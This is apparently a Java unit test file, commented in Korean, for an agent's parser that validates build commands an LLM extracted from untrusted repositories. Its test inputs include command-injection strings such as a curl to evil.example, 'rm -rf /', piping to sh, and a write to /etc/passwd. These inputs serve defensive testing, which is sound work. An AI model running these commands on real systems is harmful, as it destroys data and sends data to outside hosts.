package com.ossagent.agent.domain;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.DisplayNameGeneration;
import org.junit.jupiter.api.DisplayNameGenerator;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * 🔴 대상 저장소 문자열이 <b>실행 명령</b>이 되는 자리 — #18 · S-3.
 *
 * <p>입력은 LLM 이 대상 저장소 문서에서 뽑은 값이다(#7). 「빌드 명령」이라는 이름 때문에
 * 신뢰할 수 있는 값처럼 읽히지만 <b>출처는 남의 저장소</b>다.
 */
@DisplayNameGeneration(DisplayNameGenerator.ReplaceUnderscores.class)
class TargetCommandLineTest {

    @Test
    @DisplayName("평범한 Gradle 명령은 argv 로 쪼갠다")
    void 평범한_명령은_argv_로_쪼갠다() {
        TargetCommandLine command = TargetCommandLine.parse("./gradlew test --no-daemon");

        assertThat(command.argv()).containsExactly("./gradlew", "test", "--no-daemon");
        assertThat(command.buildTool()).isEqualTo(BuildTool.GRADLE);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "./gradlew test; curl http://evil.example/x",
            "./gradlew test && rm -rf /",
            "./gradlew test | sh",
            "./gradlew $(whoami)",
            "./gradlew `id`",
            "./gradlew test > /etc/passwd",
            "./gradlew test\nrm -rf /",
            "FOO=bar ./gradlew test",
    })
    @DisplayName("🔴 쉘 메타문자가 섞인 명령은 거부한다 — 화이트리스트 밖이다")
    void 쉘_메타문자는_거부한다_S3(String raw) {
        assertThatThrownBy(() -> TargetCommandLine.parse(raw))
                .isInstanceOf(SandboxPermanentException.class);
    }

    @Test
    @DisplayName("🔴 거부 메시지에 원문을 싣지 않는다 — 모델 출력이고 로그 인젝션 경로다")
    void 거부_메시지에_원문을_싣지_않는다_S4() {
        assertThatThrownBy(() -> TargetCommandLine.parse("./gradlew test; curl secret.example"))
                .hasMessageNotContaining("curl")
                .hasMessageNotContaining("secret.example");
    }

    @Test
    @DisplayName("🔴 Maven 은 지원하지 않는다고 실패시킨다 — 조용히 네트워크를 여는 것이 최악이다 (Q-4)")
    void Maven_은_거부한다() {
        assertThatThrownBy(() -> TargetCommandLine.parse("mvn -B test"))
                .isInstanceOf(SandboxException.class);
    }

    @Test
    @DisplayName("🔴 모르는 런처는 거부한다 — --offline 을 붙일 자리를 알 수 없다")
    void 모르는_런처는_거부한다() {
        assertThatThrownBy(() -> TargetCommandLine.parse("bash ci/build.sh"))
                .isInstanceOf(SandboxPermanentException.class);
    }

    @Test
    @DisplayName("🔴 argv[0] 으로만 판정한다 — 어딘가에 gradle 이라는 글자가 있는 것과 다르다")
    void 런처_판정은_argv0_만_본다() {
        assertThatThrownBy(() -> TargetCommandLine.parse("bash gradlew"))
                .isInstanceOf(SandboxPermanentException.class);
    }

    @Test
    @DisplayName("비었거나 상한을 넘으면 거부한다")
    void 비었거나_상한을_넘으면_거부한다() {
        assertThatThrownBy(() -> TargetCommandLine.parse("  "))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> TargetCommandLine.parse("./gradlew " + "test ".repeat(30)))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> TargetCommandLine.parse("./gradlew " + "t".repeat(500)))
                .isInstanceOf(SandboxPermanentException.class);
    }
}
